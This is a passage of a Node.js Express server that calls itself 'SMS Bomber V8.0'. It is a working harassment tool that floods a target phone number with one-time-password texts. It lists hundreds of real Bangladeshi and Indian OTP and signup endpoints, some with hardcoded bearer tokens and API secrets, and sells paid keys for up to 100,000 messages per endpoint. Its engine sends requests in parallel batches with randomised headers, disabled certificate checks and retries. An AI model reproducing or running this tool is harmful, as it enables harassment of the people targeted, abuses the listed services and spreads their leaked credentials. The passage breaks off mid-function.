    url: "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}",
    insecure: true
  },
  // --- API 44: Chokrojan ---
  {
    id: 546, name: "PHP-44 Chokrojan Passenger", method: "POST",
    url: "https://chokrojan.com/api/v1/passenger/login/mobile",
    body: {
      mobile_number: "{phone}",
      otp_token: "826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7"
    },
    headers: {
      "Authorization": "Bearer null",
      "Content-Type": "application/json;charset=UTF-8",
      "Origin": "https://chokrojan.com",
      "Referer": "https://chokrojan.com/login",
      "company-id": "1",
      "domain-name": "chokrojan.com",
      "user-platform": "3"
    },
    insecure: true
  },
  // --- API 45: Shomvob ---
  {
    id: 547, name: "PHP-45 Shomvob OTP", method: "POST",
    url: "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0",
    body: { phone: "88{phone}" },
    headers: {
      "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s",
      "Content-Type": "application/json; charset=utf-8"
    }
  },
  // --- API 46: RedX Signup v2 ---
  {
    id: 548, name: "PHP-46 RedX v2", method: "POST",
    url: "https://api.redx.com.bd/v1/user/signup",
    body: { name: "Alamin Sheikh", phoneNumber: "{phone}", service: "redx" },
    headers: { "Content-Type": "application/json" },
    insecure: true
  },
  // --- API 47: Cinematic GP Common OTP ---
  {
    id: 549, name: "PHP-47 Cinematic Common", method: "POST",
    url: "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/",
    headers: { "Content-Type": "application/json" },
    insecure: true
  },
  // --- API 48: MyBDJobs Orchestrator ---
  {
    id: 550, name: "PHP-48 MyBDJobs", method: "POST",
    url: "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount",
    body: {
      firstName: "randomName", lastName: "", gender: "M",
      email: "randomEmail", userName: "{phone}",
      password: "Kamrul12345@", confirmPassword: "Kamrul12345@",
      status: 0, mobile: "{phone}", workAreaCategory: 2,
      createdFrom: 0, createdAt: "now", decodeId: "",
      catTypeId: 1, userNameType: "mobile", disabilityId: "",
      deviceTypeId: 0, countryCode: "88", socialMediaId: "",
      socialMediaName: "", socialMediaTimestamp: "now",
      ttcId: "", gradeId: "", knownBy: "", isTtc: false,
      trainingCenterName: "", trainingDistrict: "",
      queryString: "", campaignId: 0, campaignSource: "",
      campaignReferer: "", isFromSocialMedia: false,
      isActive: 0, useType: "", uNtype: 0
    },
    dynamicFields: true,
    headers: {
      "accept": "application/json, text/plain, */*",
      "content-type": "application/json",
      "origin": "https://mybdjobs.bdjobs.com",
      "referer": "https://mybdjobs.bdjobs.com/"
    }
  }
];

// ---- V7.1 NEW APIS ----
const NEW_APIS_V71 = [
  { id: 351, name: "Walton Plaza", method: "POST", url: "https://waltonplaza.com.bd/api/auth/otp/create",
    body: { auth: { countryCode: "880", deviceUuid: "197bef80-ec8a-11f0-8299-fdfde03856d4", phone: "{phone}", type: "LOGIN" }, captchaToken: "no recapcha" } },
  { id: 352, name: "QuickMart BD", method: "POST", url: "https://quickmart.com.bd/customer/auth/phone-register", isFormData: true,
    body: { _token: "UXLmYbXMRijnLuihYcoLBXYG5bu25X4K8E6gVeqs", phone: "{phone}" } },
  { id: 353, name: "Glanis Skincare", method: "POST", url: "https://www.glanisskincare.com.bd/customer-login", isFormData: true,
    body: { _token: "tX7eVhj93u8lLSTWVBDwIBN4jvruZNqc7VVAmf1v", phone: "{phone}" } },
  { id: 354, name: "SmartDeal BD", method: "POST", url: "https://smartdeal.com.bd/register", isFormData: true,
    body: { _token: "gkjdzpI26XOPh062eg0gDxZSxX34XpOkiuHmjisZ", name: "nox", phone: "{phone}", country_code: "88", email: "", password: "unlock2022", password_confirmation: "unlock2022", checkbox_example_1: "on" } },
  { id: 355, name: "GX Sends Run-All", method: "GET", url: "https://gxsends.onrender.com/run-all?phone={phone}", isGXSends: true }
];

// ---- ORIGINAL BD APIS ----
const ORIGINAL_APIS = [
  { id: 1, name: "Bikroy.com", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
  { id: 2, name: "GP MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
  { id: 3, name: "Shukhee", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
  { id: 4, name: "MedEasy Basic", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
  { id: 5, name: "Ultranet", method: "GET", url: "http://ultranetrn.com.br/fonts/api.php?number={phone}" },
  { id: 6, name: "eCourier", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
  { id: 7, name: "Binge GET", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
  { id: 8, name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
  { id: 9, name: "Deshal", method: "POST", url: "https://app.deshal.net/api/auth/login", body: { phone: "{phone}" } },
  { id: 10, name: "GP Web", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: { msisdn: "{phone}" } },
  { id: 11, name: "GP FWA/Bkash", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: { phone: "{phone}", email: "", language: "en" } },
  { id: 12, name: "BusBD", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: { phone: "+88{phone}" } },
  { id: 13, name: "Paperfly", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: { full_name: "Apk", email_address: "apk@test.com", company_name: "Ahgbd", phone_number: "{phone}" } },
  { id: 14, name: "OsudPotro", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: { mobile: "+880{phone}", deviceToken: "web", language: "en", os: "web" } },
  { id: 15, name: "Apex4u", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: { phoneNumber: "{phone}" } },
  { id: 16, name: "Bohubrihi", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: { phone: "{phone}", intent: "login" } },
  { id: 17, name: "Fundesh", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: { msisdn: "{phone}" } },
  { id: 18, name: "Jatri", method: "POST", url: "https://user-api.jslglobal.co/v2/send-otp", body: { phone: "+88{phone}", jatri_token: "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj" } },
  { id: 19, name: "RedX Merchant", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: { mobile: "+88{phone}" } },
  { id: 20, name: "RabbitHole", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: { mobile: "+88{phone}" } },
  { id: 21, name: "Qcoom", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: { mobileNumber: "+88{phone}" } },
  { id: 22, name: "Garibook", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: { mobile: "+880{phone}", recaptcha_token: "garibookcaptcha", channel: "web" } },
  { id: 23, name: "Training.gov", method: "POST", url: "https://training.gov.bd/backoffice/api/user/sendOtp", body: { mobile: "{phone}" } },
  { id: 24, name: "Shikho #1", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: { phone: "{phone}", intent: "ap-discount-request" } },
  { id: 25, name: "Easy.com.bd", method: "POST", url: "https://core.easy.com.bd/api/v1/registration", body: { name: "Tusar", email: "apk@test.com", mobile: "{phone}", password: "amitusar", password_confirmation: "amitusar" } },
  { id: 26, name: "Robi DA", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: { msisdn: "{phone}" } },
  { id: 27, name: "Hoichoi", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: { phoneNumber: "{phone}", requestType: "send", emailConsent: true, whatsappConsent: true } },
  { id: 28, name: "Addatimes", method: "POST", url: "https://app.addatimes.com/api/login", body: { phone: "{phone}", country_code: "BD" } },
  { id: 29, name: "Regal OTP", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: { phone: "{phone}", verification_code: "" } },
  { id: 30, name: "Regal Register", method: "POST", url: "https://regalfurniturebd.com/api/auth/register", body: { name: "User", email: "u@e.com", phone: "{phone}", password: "pass123" } },
  { id: 31, name: "DeeptoPlay Web", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: { email: "apk@test.com", phone_number: "88{phone}" } },
  { id: 32, name: "Timezone OTP", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: { phone: "{phone}" } },
  { id: 33, name: "Timezone Register", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", body: { name: "Tusar", email: "t@t.com", phone: "{phone}", password: "aAeMY@5hG8iUfD4", password_confirmation: "aAeMY@5hG8iUfD4" } },
  { id: 34, name: "UpaySystem", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: { device_uuid: "abc", firebase_token: "xyz", geo_location: "0,0", mno: "Grameenphone", wallet_number: "{phone}" } },
  { id: 35, name: "Chorki Web", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: { number: "+880{phone}" } },
  { id: 36, name: "Arogga Web", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148&os=Android&osv=12", isFormData: true, body: { mobile: "{phone}", fcmToken: "", referral: "" } },
  { id: 37, name: "Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: { mobileNum: "{phone}", countryDialingCode: "880" } },
  { id: 38, name: "AppLink V2", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: { msisdn: "880{phone}" } },
  { id: 39, name: "Care-Box", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: { Name: "Abdullah", Phone: "+880{phone}" } },
  { id: 40, name: "Ghoori", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: { mobile_no: "{phone}" } },
  { id: 41, name: "Jayabaji", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: { mobileno: "{phone}", username: "user864", new_password: "tPNVOcen!6XEz3b", confirm_new_password: "tPNVOcen!6XEz3b", country_code: "880", country: "BD", currency: "BDT", language: "en" } },
  { id: 42, name: "Swap.com.bd", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: { phone: "{phone}" } },
  { id: 43, name: "BdTickets V1", method: "POST", url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", body: { phone: "+880{phone}" } },
  { id: 44, name: "Binge POST", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: { mobile: "{phone}" } },
  { id: 45, name: "SendMySMS", method: "POST", url: "https://sendmysms.net/send-otp.php", isFormData: true, body: { phonenumber: "{phone}" } },
  { id: 46, name: "Shikho #2", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: { auth_type: "login", phone: "{phone}", vendor: "shikho", type: "student" } },
  { id: 47, name: "Eonbazar", method: "POST", url: "https://app.eonbazar.com/api/auth/login", body: { method: "otp", mobile: "{phone}" } },
  { id: 48, name: "NESCO", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: { phone_number: "{phone}" } },
  { id: 49, name: "Quizgiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", body: { country_code: "+880", phone: "{phone}" } },
  { id: 50, name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: { phone: "{phone}", applicationChannel: "WEB_APP" } },
  { id: 51, name: "Bioscope Web", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: { phone: "{phone}", applicationChannel: "WEB_APP" } },
  { id: 52, name: "ShadowX API", method: "GET", url: "https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}", isShadowX: true }
];

// ---- INDIAN APIS ----
const INDIAN_APIS = [
  { id: 53, name: "BeepKart", method: "POST", url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", body: { phone: "{phone}", city: 362 } },
  { id: 54, name: "Smytten", method: "POST", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", body: { phone: "{phone}", email: "test@example.com" } },
  { id: 55, name: "MyHubble", method: "POST", url: "https://api.myhubble.money/v1/auth/otp/generate", body: { phoneNumber: "{phone}", channel: "SMS" } },
  { id: 56, name: "Housing.com", method: "POST", url: "https://login.housing.com/api/v2/send-otp", body: { phone: "{phone}", country_url_name: "in" } },
  { id: 57, name: "RentoMojo", method: "POST", url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", body: { phone: "{phone}" } },
  { id: 58, name: "Khatabook", method: "POST", url: "https://api.khatabook.com/v1/auth/request-otp", body: { phone: "{phone}", app_signature: "wk+avHrHZf2" } },
  { id: 59, name: "Animall", method: "POST", url: "https://animall.in/zap/auth/login", body: { phone: "{phone}", signupPlatform: "NATIVE_ANDROID" } },
  { id: 60, name: "Cosmofeed", method: "POST", url: "https://prod.api.cosmofeed.com/api/user/authenticate", body: { phone: "{phone}", version: "1.4.28" } },
  { id: 61, name: "Spencers", method: "POST", url: "https://jiffy.spencers.in/user/auth/otp/send", body: { mobile: "{phone}" } },
  { id: 62, name: "Wakefit", method: "POST", url: "https://api.wakefit.co/api/consumer-sms-otp/", body: { mobile: "{phone}" } },
  { id: 63, name: "Hungama", method: "POST", url: "https://communication.api.hungama.com/v1/communication/otp", body: { mobileNo: "{phone}", countryCode: "+91", appCode: "un", messageId: "1", device: "web" } },
  { id: 64, name: "Doubtnut", method: "POST", url: "https://api.doubtnut.com/v4/student/login", body: { phone_number: "{phone}", language: "en" } },
  { id: 65, name: "PenPencil", method: "POST", url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", body: { organizationId: "5eb393ee95fab7468a79d189", mobile: "{phone}" } },
  { id: 66, name: "APU Inky", method: "GET", url: "https://apu-inky.vercel.app/send?number={phone}" }
];

// ---- SHADOWX & LMNx9 FILLER APIS ----
const GX_APIS = [];
for (let i = 1; i <= 50; i++) {
  GX_APIS.push({
    id: 150 + i, name: `ShadowX ${i}`, method: "GET",
    url: `https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}`,
    isShadowX: true
  });
}
const LMNX9_APIS = [];
for (let i = 1; i <= 50; i++) {
  LMNX9_APIS.push({
    id: 200 + i, name: `LMNx9 API${i}`, method: "GET",
    url: `https://lmnx9-sms-spam-v11.onrender.com/api${i}?number={phone}`,
    isLMNx9: true
  });
}

// ---- COMBINE ALL ----
const SMS_APIS = [
  ...PHP_CONVERTED_APIS,
  ...NEW_APIS_V71,
  ...ORIGINAL_APIS,
  ...INDIAN_APIS,
  ...GX_APIS,
  ...LMNX9_APIS
];

console.log(`📡 Total APIs loaded: ${SMS_APIS.length}`);

// ============================================================
// PLAN CONFIG
// ============================================================
const PLAN_CONFIG = {
  default: { name: 'Default', maxCount: 300, requiresKey: false },
  free: { name: 'Free', maxCount: 50, requiresKey: false },
  premium: { name: 'Premium', maxCount: 10000, requiresKey: true },
  enterprise: { name: 'Enterprise', maxCount: 50000, requiresKey: true },
  unlimited: { name: 'Unlimited', maxCount: 100000, requiresKey: true }
};

// ============================================================
// KEY MANAGER
// ============================================================
class KeyManager {
  constructor() {
    this.keysFile = path.join(__dirname, 'keys.json');
    this.validKeys = this.loadKeys();
  }
  loadKeys() {
    try {
      if (fs.existsSync(this.keysFile)) {
        const data = JSON.parse(fs.readFileSync(this.keysFile, 'utf8'));
        const m = new Map();
        Object.entries(data).forEach(([k, v]) => {
          m.set(k, { expiry: new Date(v.expiry), plan: v.plan, usageCount: v.usageCount || 0 });
        });
        return m;
      }
    } catch (e) { console.error('Key load err:', e.message); }
    return new Map();
  }
  saveKeys() {
    const obj = {};
    for (const [k, v] of this.validKeys.entries()) {
      obj[k] = { expiry: v.expiry.toISOString(), plan: v.plan, usageCount: v.usageCount || 0 };
    }
    fs.writeFileSync(this.keysFile, JSON.stringify(obj, null, 2));
  }
  generateKey(plan = 'premium', days = 30) {
    const key = Utility.generateApiKey();
    const expiry = new Date();
    expiry.setDate(expiry.getDate() + days);
    this.validKeys.set(key, { expiry, plan, usageCount: 0 });
    this.saveKeys();
    return { apiKey: key, expiryDate: expiry, plan };
  }
  validateKey(key) {
    if (!this.validKeys.has(key)) return false;
    return new Date() < this.validKeys.get(key).expiry;
  }
  getKeyInfo(key) {
    if (!this.validKeys.has(key)) return null;
    const k = this.validKeys.get(key);
    return {
      key, plan: k.plan, expires: k.expiry.toISOString(),
      valid: new Date() < k.expiry,
      daysLeft: Math.max(0, Math.ceil((k.expiry - new Date()) / 86400000)),
      usageCount: k.usageCount
    };
  }
  useKey(key) {
    const k = this.validKeys.get(key);
    if (!k) return false;
    k.usageCount = (k.usageCount || 0) + 1;
    this.saveKeys();
    return true;
  }
  getAllKeys() {
    const out = [];
    for (const [k, v] of this.validKeys.entries()) {
      out.push({ key: k, plan: v.plan, expires: v.expiry.toISOString(), valid: new Date() < v.expiry, usageCount: v.usageCount || 0 });
    }
    return out;
  }
}

// ============================================================
// RATE LIMITER
// ============================================================
class RateLimiter {
  constructor() { this.requests = new Map(); }
  checkLimit(identifier) {
    if (!CONFIG.security.rateLimit.enabled) return true;
    const now = Date.now();
    const w = CONFIG.security.rateLimit.windowMs;
    const max = CONFIG.security.rateLimit.maxRequests;
    if (!this.requests.has(identifier)) this.requests.set(identifier, []);
    const arr = this.requests.get(identifier).filter(t => now - t < w);
    arr.push(now);
    this.requests.set(identifier, arr);
    return arr.length <= max;
  }
  getRemaining(identifier) {
    const now = Date.now();
    const w = CONFIG.security.rateLimit.windowMs;
    const max = CONFIG.security.rateLimit.maxRequests;
    if (!this.requests.has(identifier)) return max;
    const arr = this.requests.get(identifier).filter(t => now - t < w);
    return Math.max(0, max - arr.length);
  }
}

// ============================================================
// EXPRESS APP
// ============================================================
const app = express();
const bombController = new BombController();
const keyManager = new KeyManager();
const rateLimiter = new RateLimiter();

app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

app.use((req, res, next) => {
  req.requestId = Utility.generateId();
  res.setHeader('X-Request-ID', req.requestId);
  next();
});

app.use((req, res, next) => {
  const ip = req.ip || req.connection.remoteAddress;
  const apiKey = req.query.key || req.headers['x-api-key'];
  const id = apiKey || ip;
  if (!rateLimiter.checkLimit(id)) {
    return res.status(429).json({ success: false, error: ERROR_MESSAGES.RATE_LIMIT, developer: DEVELOPER_INFO });
  }
  next();
});

// ============================================================
// ENDPOINTS
// ============================================================
app.get('/', (req, res) => {
  res.json({ success: true, developer: DEVELOPER_INFO, message: 'SMS Bomber V8.0 running', endpoints: {
    info: '/api', spam: '/api/spam?number=01700000000&count=1',
    stop: '/api/stop?all=true', pause: '/api/pause?all=true', resume: '/api/resume?all=true',
    status: '/api/status', stats: '/api/stats', alllist: '/api/alllist',
    apistats: '/api/api-stats', health: '/api/health',
    createKey: '/api/expiredate=30&createkey?plan=premium&days=30'
  }});
});

app.get('/api', (req, res) => {
  res.json({
    developer: DEVELOPER_INFO, version: "8.0.0-FULL", total_apis: SMS_APIS.length,
    plans: Object.keys(PLAN_CONFIG)
  });
});

app.get('/api/health', (req, res) => {
  res.json({
    status: 'active', developer: DEVELOPER_INFO, version: "8.0.0-FULL",
    uptime: process.uptime(), total_apis: SMS_APIS.length,
    active_jobs: bombController.activeJobs.size,
    memory: Utility.getMemoryUsage()
  });
});

// -------- SPAM --------
app.get('/api/spam', async (req, res) => {
  const { plan, number, count = 1, key } = req.query;
  let currentPlan = 'default';
  let planConfig = PLAN_CONFIG.default;
  if (plan && PLAN_CONFIG[plan]) { currentPlan = plan; planConfig = PLAN_CONFIG[plan]; }

  if (planConfig.requiresKey) {
    if (!key || !keyManager.validateKey(key)) {
      return res.status(401).json({ success: false, error: ERROR_MESSAGES.INVALID_API_KEY, developer: DEVELOPER_INFO });
    }
    keyManager.useKey(key);
  }

  if (!number) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM, param: 'number', developer: DEVELOPER_INFO });

  const cleanNumber = Utility.parsePhone(number);
  if (!Utility.isValidPhone(cleanNumber)) {
    return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE, example: '017XXXXXXXX', developer: DEVELOPER_INFO });
  }

  let perApiCount = parseInt(count) || 1;
  if (perApiCount < 1) perApiCount = 1;
  if (perApiCount > planConfig.maxCount) {
    return res.status(400).json({ success: false, error: `Max ${planConfig.maxCount} for ${currentPlan}`, developer: DEVELOPER_INFO });
  }

  const totalSMS = SMS_APIS.length * perApiCount;
  const jobId = bombController.registerJob(cleanNumber, totalSMS, { plan: currentPlan, perApiCount });

  console.log(`📱 [${currentPlan.toUpperCase()}] JOB ${jobId}: ${perApiCount}x${SMS_APIS.length} to ${Utility.maskPhone(cleanNumber)}`);

  (async () => {
    try { await sendBatch(SMS_APIS, cleanNumber, perApiCount, jobId, bombController); }
    catch (e) { console.error(`JOB ${jobId} failed:`, e.message); bombController.stopJob(jobId); }
  })();

  res.json({
    success: true, developer: DEVELOPER_INFO, jobId, plan: currentPlan,
    target: Utility.maskPhone(cleanNumber), per_api_count: perApiCount,
    total_apis: SMS_APIS.length, total_sms: totalSMS, status: 'started',
    stop_endpoint: `/api/stop?jobId=${jobId}`,
    status_endpoint: `/api/status?jobId=${jobId}`, timestamp: Utility.getISOString()
  });
});

// -------- STOP --------
app.get('/api/stop', (req, res) => {
  const { jobId, all } = req.query;
  if (all === 'true') {
    const c = bombController.stopAllJobs();
    return res.json({ success: true, stopped_count: c, developer: DEVELOPER_INFO });
  }
  if (jobId) {
    const ok = bombController.stopJob(jobId);
    return res.json({ success: ok, jobId, developer: DEVELOPER_INFO });
  }
  res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM, developer: DEVELOPER_INFO });
});

// -------- PAUSE --------
app.get('/api/pause', (req, res) => {
  const { jobId, all } = req.query;
  if (all === 'true') return res.json({ success: true, paused_count: bombController.pauseAllJobs(), developer: DEVELOPER_INFO });
  if (jobId) return res.json({ success: bombController.pauseJob(jobId), jobId, developer: DEVELOPER_INFO });
  res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM, developer: DEVELOPER_INFO });
});

// -------- RESUME --------
app.get('/api/resume', (req, res) => {
  const { jobId, all } = req.query;
  if (all === 'true') return res.json({ success: true, resumed_count: bombController.resumeAllJobs(), developer: DEVELOPER_INFO });
  if (jobId) return res.json({ success: bombController.resumeJob(jobId), jobId, developer: DEVELOPER_INFO });
  res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM, developer: DEVELOPER_INFO });
});

// -------- STATUS --------
app.get('/api/status', (req, res) => {
  const { jobId } = req.query;
  if (jobId) {
    const j = bombController.getJobStatus(jobId);
    if (!j) return res.status(404).json({ success: false, error: ERROR_MESSAGES.JOB_NOT_FOUND, developer: DEVELOPER_INFO });
    return res.json({ success: true, job: j, developer: DEVELOPER_INFO });
  }
  res.json({ success: true, stats: bombController.getStats(), jobs: bombController.getAllJobs(), developer: DEVELOPER_INFO });
});

// -------- STATS --------
app.get('/api/stats', (req, res) => {
  const keys = keyManager.getAllKeys();
  res.json({
    success: true, developer: DEVELOPER_INFO,
    bomb_stats: bombController.getStats(),
    keys: { total: keys.length, valid: keys.filter(k => k.valid).length },
    apis: { total: SMS_APIS.length, get: SMS_APIS.filter(a => a.method === 'GET').length, post: SMS_APIS.filter(a => a.method === 'POST').length },
    api_stats: apiStatsTracker.getSummary()
  });
});

// -------- ALL LIST (NEW) --------
app.get('/api/alllist', (req, res) => {
  const statsMap = new Map(apiStatsTracker.getAll().map(s => [s.id, s]));
  const list = SMS_APIS.map(api => {
    const s = statsMap.get(api.id) || { calls: 0, success: 0, failed: 0, lastCall: null, avgResponseTime: 0 };
    return {
      id: api.id, name: api.name, method: api.method,
      url: typeof api.url === 'string' ? api.url : '[dynamic]',
      flags: {
        shadowX: !!api.isShadowX, lmnx9: !!api.isLMNx9, gx: !!api.isGXSends,
        formData: !!api.isFormData, insecure: !!api.insecure
      },
      stats: {
        calls: s.calls, success: s.success, failed: s.failed,
        successRate: s.calls > 0 ? ((s.success / s.calls) * 100).toFixed(2) + '%' : '0%',
        avgResponseTime: s.avgResponseTime + 'ms',
        lastCall: s.lastCall ? new Date(s.lastCall).toISOString() : null
      }
    };
  });
  res.json({
    success: true, developer: DEVELOPER_INFO,
    total_apis: SMS_APIS.length,
    summary: apiStatsTracker.getSummary(),
    apis: list, timestamp: Utility.getISOString()
  });
});

// -------- API-STATS (NEW) --------
app.get('/api/api-stats', (req, res) => {
  res.json({
    success: true, developer: DEVELOPER_INFO,
    summary: apiStatsTracker.getSummary(),
    per_api: apiStatsTracker.getAll()
  });
});

// -------- CREATE KEY --------
app.get('/api/expiredate=30&createkey', (req, res) => {
  const { plan = 'premium', days = 30 } = req.query;
  if (!PLAN_CONFIG[plan]) return res.status(400).json({ success: false, error: `Invalid plan: ${plan}`, available: Object.keys(PLAN_CONFIG), developer: DEVELOPER_INFO });
  const r = keyManager.generateKey(plan, parseInt(days) || 30);
  res.json({ success: true, api_key: r.apiKey, plan: r.plan, expiry: r.expiryDate.toISOString(), developer: DEVELOPER_INFO });
});

// -------- CHECK KEY --------
app.get('/api/checkkey', (req, res) => {
  const { key } = req.query;
  if (!key) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM, developer: DEVELOPER_INFO });
  const info = keyManager.getKeyInfo(key);
  if (!info) return res.status(404).json({ success: false, error: 'Invalid key', developer: DEVELOPER_INFO });
  res.json({ success: true, ...info, developer: DEVELOPER_INFO });
});

// 404
app.use((req, res) => res.status(404).json({ success: false, error: 'Endpoint not found', path: req.path, developer: DEVELOPER_INFO }));
app.use((err, req, res, next) => {
  console.error('❌', err.stack);
  res.status(500).json({ success: false, error: ERROR_MESSAGES.INTERNAL_ERROR, message: err.message, developer: DEVELOPER_INFO });
});

// ============================================================
// CORE BOMBING ENGINE
// ============================================================
function buildDynamicBody(api, phone) {
  // Handle dynamic-generated fields (Proiojon, MyBDJobs, Kabbik)
  const rand = Utility.randomString(10);
  const randName = Utility.randomName();
  const randEmail = randName.toLowerCase() + rand + '@gmail.com';
  const now = new Date().toISOString().slice(0, 19);

  const stringify = (obj) => {
    if (obj === null || obj === undefined) return obj;
    if (Array.isArray(obj)) return obj.map(stringify);
    if (typeof obj === 'object') {
      const out = {};
      for (const [k, v] of Object.entries(obj)) out[k] = stringify(v);
      return out;
    }
    if (typeof obj === 'string') {
      return obj
        .replace(/{phone}/g, phone)
        .replace(/{phone_e164}/g, phone)
        .replace(/{phone_10}/g, phone.slice(-10))
        .replace(/{count}/g, 1)
        .replace(/randomName/g, randName)
        .replace(/randomEmail/g, randEmail)
        .replace(/currentTime/g, Date.now())
        .replace(/now/g, now);
    }
    return obj;
  };
  return stringify(api.body);
}

async function callSingleAPI(api, phone, jobId, attempt = 0) {
  const startTime = Date.now();
  if (!bombController.isJobActive(jobId)) {
    return { success: false, api_id: api.id, api_name: api.name, error: 'Job stopped', stopped: true, responseTime: 0 };
  }

  try {
    const cleanPhone = Utility.parsePhone(phone);
    const headers = getRandomHeaders(api.headers || {});

    let url = typeof api.url === 'function' ? api.url(cleanPhone) : api.url;
    if (typeof url === 'string') {
      url = url
        .replace(/{phone}/g, cleanPhone)
        .replace(/{phone_e164}/g, Utility.normalizeBD(cleanPhone))
        .replace(/{phone_10}/g, cleanPhone.slice(-10))
        .replace(/{count}/g, 1);
    }

    const config = {
      method: api.method,
      url,
      headers,
      timeout: api.timeout || CONFIG.performance.timeout,
      validateStatus: () => true,
      httpsAgent: api.insecure
        ? new (require('https').Agent)({ rejectUnauthorized: false })
        : undefined
    };

    if (api.method === 'POST' && api.body) {
      const body = buildDynamicBody(api, cleanPhone);
      if (api.isFormData) {
        config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        config.data = new URLSearchParams(body).toString();
      } else {
        config.data = body;
      }
    }

    const response = await axios(config);
    const responseTime = Date.now() - startTime;
    const isSuccess = response.status >= 200 && response.status < 500;
    apiStatsTracker.record(api.id, api.name, isSuccess, responseTime);
    return {
      success: isSuccess,
      api_id: api.id,
      api_name: api.name,
      status: response.status,
      responseTime
    };
  } catch (error) {
    const responseTime = Date.now() - startTime;
    apiStatsTracker.record(api.id, api.name, false, responseTime, error.message);

    if (attempt < CONFIG.performance.maxRetries && bombController.isJobActive(jobId)) {
      await Utility.sleep(CONFIG.performance.retryDelay * (attempt + 1));
      return callSingleAPI(api, phone, jobId, attempt + 1);
    }
    return {
      success: false, api_id: api.id, api_name: api.name,
      error: error.message, status: error.response?.status || null, responseTime
    };
  }
}

async function sendBatch(apis, phone, countPerApi, jobId, controller) {
  const actualCount = Math.min(countPerApi, CONFIG.performance.maxCountPerAPI);
  const BATCH_SIZE = CONFIG.performance.parallelRequests;
  const shuffled = Utility.shuffleArray([...apis]);
  let processed = 0;

  for (let i = 0; i < shuffled.length; i += BATCH_SIZE) {
    if (!controller.isJobActive(jobId)) {
